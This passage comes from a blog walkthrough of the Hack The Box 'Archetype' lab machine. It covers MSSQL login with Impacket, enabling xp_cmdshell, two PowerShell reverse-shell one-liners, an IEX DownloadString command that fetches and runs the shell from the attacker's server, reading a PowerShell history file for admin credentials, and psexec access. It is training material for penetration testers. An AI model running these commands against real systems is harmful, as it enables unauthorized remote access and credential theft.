</a>mssqlclient.py</p><blockquote><em>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.source : </em><a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer"><em>https://github.com/SecureAuthCorp/impacket</em></a></blockquote><h3 id="021-download-and-use-mssqlclientpy"><strong>02.1 Download and use mssqlclient.py</strong></h3><p>First we need to simply <code>wget</code> and download the <code>mssqlclient.py</code> script.</p><pre><code class="language-bash">wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
</code></pre><p>And then run the script and check whether we are working as a <code>sysadmin</code> (privileged user) or not.</p><pre><code class="language-bash">python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth</code></pre><p>Now we can use the <a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15" rel="noopener noreferrer"><strong>IS_SRVROLEMEMBER </strong></a>function to check whether the current SQL user has <code>sysadmin</code> (highest level) privileges on the SQL Server.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-10.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1000" height="512" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-10.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-10.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>According to the return value (1 = login is a member of role.) yes we have highest privileges.&#x1F601; This will allow us to enable <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noopener noreferrer"><code>xp_cmdshell</code></a> and gain RCE on the host.</p><p>Check below awesome blog posts to understand that trick.</p><ul><li>Pentesting MSSQL - Microsoft SQL Server <a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server" rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></li><li>MySQL Information Gathering <a href="https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql" rel="noopener noreferrer">https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql</a></li></ul><h3 id="022-usage-of-xpcmdshell"><strong>02.2 Usage of &#xA0;xp_cmdshell</strong></h3><p>To get <code>xp_cmdshell</code>, type below commands.</p><pre><code class="language-bash">EXEC sp_configure &apos;Show Advanced Options&apos;, 1; 
reconfigure; 
sp_configure; 
EXEC sp_configure &apos;xp_cmdshell&apos;, 1 
reconfigure; 
xp_cmdshell &quot;whoami&quot;</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-11.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1000" height="304" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-11.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-11.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>However, Now we can run system commands using <code>xp_cmdshell</code>. why can&apos;t we get proper shell. &#x1F920;</p><p>Hmmmmah !! what a nice smell for <code>PowerShell Reverse Shell</code> huh! &#x1F60D;</p><p>You can get some idea about reverse shells from below links,</p><ul><li>Reverse Shell Generator <a href="https://www.revshells.com/" rel="noopener noreferrer">https://www.revshells.com</a>&#x200B;</li><li>Nishang framework <a href="https://github.com/samratashok/nishang" rel="noopener noreferrer">https://github.com/samratashok/nishang</a>&#x200B;</li><li>TCP port communications with PowerShell <a href="https://livebook.manning.com/book/powershell-deep-dives/chapter-4/" rel="noopener noreferrer">https://livebook.manning.com/book/powershell-deep-dives/chapter-4</a>&#x200B;</li></ul><p>But personally, I like to use Nishang&apos;s <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1" rel="noopener noreferrer">Invoke-PowerShellTcpOneLine.ps1</a> to create my rev-shell.</p><p>After deleting all comments and unwanted things, powershell script will be like this. &#x1F447; Remember; Type <strong><strong><code>ifconfig tun0</code> </strong></strong>and replace<strong><strong> YourIP</strong></strong></p><pre><code class="language-bash">$client = New-Object System.Net.Sockets.TCPClient(&apos;YourIP&apos;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$sm=(New-Object Net.Sockets.TCPClient(&apos;YourIP&apos;,4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)}</code></pre><h3 id="023-get-reverse-shell"><strong>02.3 Get Reverse Shell</strong></h3><p>Now time to get reverse shell. Save above <code>powershell script</code> as anyname.ps1 (here I use script.ps1) and power up python demon webserver. I&apos;m a very lasy man you know &#x1F644; so here I use <code><a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer">updog</a></code><a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer"> </a>instead of typing long shit in python &#x1F611;</p><blockquote><em>Updog is a replacement for Python&apos;s </em><code><em>SimpleHTTPServer</em></code><em>. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use HTTP basic auth.source : </em><a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer"><em>https://github.com/sc0tfree/updog</em></a><em>&#x200B;</em></blockquote><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-12.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1000" height="238" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-12.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-12.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>To listen the connection, I always use the swiss army knife (<strong><strong>netcat) </strong></strong>tool. personally I do not like to get shell through multi handler (metasploit). Trust me, using <code>netcat</code> tool you can learn a lot of things beyond <code>metaspolit</code>. &#x1F47D;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-13.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1000" height="214" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-13.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-13.png 1000w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="03-exploit-the-target-%E2%80%A6"><strong>03. Exploit the target &#x2026;</strong></h2><p>Now we can issue the command to download and execute the reverse shell through <code>xp_cmdshell</code>.</p><pre><code class="language-bash">EXEC xp_cmdshell &apos;echo IEX (New-Object Net.WebClient).DownloadString(&quot;http://10.10.16.39:9090/script.ps1&quot;) | powershell -noprofile&apos;
</code></pre><p>I divided up my terminal up to 3 parts using &#xA0;<a href="https://github.com/tmux/tmux/wiki" rel="noopener noreferrer">Tmux</a> multiplexer.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-14.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1555" height="738" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-14.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-14.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-14.png 1555w" sizes="(min-width: 720px) 720px"></figure><p>Woooh!!! We got our shell. &#x1F480; A shell is received as <strong><strong><code>sql_svc</code></strong></strong>, and we can get the user.txt flag.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-15.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="723" height="448" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-15.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-15.png 723w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="04-privilege-escalation-%E2%80%A6"><strong>04. Privilege Escalation &#x2026;</strong></h2><p>To escalate privileges we can run different tools. By the way, before run any tool there are some steps that you need to run to enumerate some information. I will be showing you one by one in each walkthroughs.</p><p>Did you remember? now we are in service account called <strong><strong><code>sql_svc</code>. </strong></strong>It&apos;s good practice to check recently accessed files/executed commands (<em><em>Keep in mind as good practice</em></em>). &#xA0;Mostly (default) our console history will be saved in <code>C:\Users\&lt;account_name&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code> . Now you understand what our next step is.</p><p>Right, Let&apos;s check above file using <code>type</code> command.</p><pre><code class="language-bash">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-16.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1000" height="202" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-16.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-16.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Oh no no no noooo.. You see?</p><p>The backup share is mapped with admin credentials. Remember if you saw something like this. ready to launch Impacket&apos;s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py" rel="noopener noreferrer"><code>psexec.py</code></a> script.</p><pre><code class="language-bash">python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-17.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1000" height="409" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-17.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-17.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Finally we have Administrator Privileges. &#x1F44C; Now we can access the flag on the administrator desktop.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://h4rithd.com/blog/content/images/2021/06/image-18.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1094" height="614" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-18.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-18.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-18.png 1094w" sizes="(min-width: 720px) 720px"><figcaption>root.txt</figcaption></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-19.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="867" height="764" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-19.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-19.png 867w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-20.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="292" height="172"></figure><p>Okay... I&#x2019;ll see you on the next box! <a href="https://h4rithd.com/blog/starting-point-htb-oopsie-walkthrough/index.html">Oopsie</a> &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item></channel></rss>